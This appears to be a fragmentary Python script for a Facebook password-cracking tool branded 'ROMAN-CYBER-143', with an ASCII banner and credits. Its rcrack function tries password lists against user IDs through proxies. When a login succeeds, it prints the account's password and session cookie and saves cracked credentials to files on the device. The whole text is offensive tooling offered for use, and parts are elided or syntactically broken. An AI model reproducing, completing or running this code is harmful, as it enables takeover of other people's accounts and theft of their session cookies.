...
.d8888b.  .d88b.  .88b  d88.  .d8b.  d8b   db 

88  `8D .8P  Y8. 88'YbdP`88 d8' `8b 888o  88 

88oobY' 88    88 88  88  88 88ooo88 88V8o 88 

88`8b   88    88 88  88  88 88~~~88 88 V8o88 

88 `88. `8b  d8' 88  88  88 88   88 88  V888 

88   YD  `Y88P'  YP  YP  YP YP   YP VP   V8P 

                                                                                                                      

       ┌━━━━━━━━━━━━━━━━━ ROMAN ━━━━━━━━━━━━━━━━━━━┑

               \033[1;97mCREATED BY   :  ROMAN        

               \033[1;91mFACEBOK      :  FH Roman          

               \033[1;97mGITHUB       :  ROMAN-XXX     
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO ROMAN-CYBER-143 TOOLS🔥')prox=open('prox.txt','r').read().splitlines()
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[ROMAN\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[38;5;46m[ROMAN-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')

                open('/sdcard/ROMAN-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                #print('\r\r\033[1;31m[ROMAN-CP] '+uid+ ' | ' +ps+'')

                open('/sdcard/ROMAN-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
